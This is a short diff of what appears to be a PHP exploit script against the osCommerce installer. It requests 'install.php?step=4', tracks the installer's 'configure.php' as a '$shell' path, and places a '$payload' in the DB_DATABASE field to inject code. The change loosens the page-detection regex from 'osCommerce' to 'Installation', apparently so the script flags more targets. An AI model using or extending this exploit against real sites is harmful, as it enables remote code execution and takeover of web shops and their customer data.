@@ -29,7 +29,7 @@ $target = $url."/catalog/install/install.php?step=4";
 $shell = $url."/catalog/install/includes/configure.php";
 $install = request($target);
 
-if($install["head"] == 200 && preg_match("/osCommerce/", $install["body"])) {
+if($install["head"] == 200 && preg_match("/Installation/", $install["body"])) {
 	echo "[*] ".$url."\n";
 	echo "[+] Installation page ok\n";
 	$data["DB_DATABASE"] = $payload;
